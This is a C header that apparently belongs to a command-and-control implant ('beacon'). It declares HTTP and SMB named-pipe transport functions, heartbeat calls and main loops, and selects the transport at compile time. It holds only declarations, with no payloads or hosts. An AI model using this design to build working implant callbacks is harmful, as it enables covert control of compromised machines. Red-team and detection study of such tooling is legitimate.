/* beacon/include/Transport.h
 * Common transport interface.  Http.c and Smb.c both implement NAX_TRANSPORT_FN.
 * NaxSend is a compile-time alias - no runtime dispatch overhead.
 *
 * To add a new transport:
 *   1. Implement NAX_TRANSPORT_FN in src/Transport/YourTransport.c
 *   2. Add a NAX_TRANSPORT_* constant and case in the #if chain below
 *   3. Build with -DNAX_TRANSPORT_PROFILE=NAX_TRANSPORT_YOUR             */

#pragma once
#include "Instance.h"

/* ========= [ transport function type ] ========= */

/* All transports share this signature.
 * url_w  : null-terminated wide URL (HTTP) or pipe path (SMB)
 * sid    : 16-char hex session ID (used as HTTP header or pipe auth)
 * Returns NAX_OK on success, NAX_ERR_NET on any failure.                */
typedef INT (*NAX_TRANSPORT_FN)(
    PNAX_INSTANCE  Nax,
    const PWCHAR   url_w,
    const PCHAR    sid,
    const PBYTE    body,     UINT32  body_len,
    PBYTE          resp_buf, UINT32* resp_len
);

/* ========= [ compile-time profile selection ] ========= */

#define NAX_TRANSPORT_HTTP  0
#define NAX_TRANSPORT_SMB   1   /* Phase 7 */

#ifndef NAX_TRANSPORT_PROFILE
#  define NAX_TRANSPORT_PROFILE NAX_TRANSPORT_HTTP
#endif

/* ========= [ protocol declarations ] ========= */

FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid,
                      const PBYTE body, UINT32 body_len,
                      PBYTE resp_buf, UINT32* resp_len );

FUNC INT NaxSmbPost( PNAX_INSTANCE Nax, const PWCHAR pipe_path, const PCHAR sid,
                     const PBYTE body, UINT32 body_len,
                     PBYTE resp_buf, UINT32* resp_len );

FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid,
                     const PBYTE body, UINT32 body_len,
                     PBYTE resp_buf, UINT32* resp_len );

FUNC INT NaxHttpGetOrPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid,
                           const PBYTE body, UINT32 body_len,
                           PBYTE resp_buf, UINT32* resp_len );

/* ========= [ transport main loops ] ========= */

FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax );
FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax );

/* ========= [ NaxSend alias ] ========= */

#if   NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
#  define NaxSend           NaxHttpPost
#  define NaxSendHeartbeat  NaxHttpGetOrPost
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
#  define NaxSend           NaxSmbPost
#  define NaxSendHeartbeat  NaxSmbPost
#else
#  error "Unknown NAX_TRANSPORT_PROFILE"
#endif
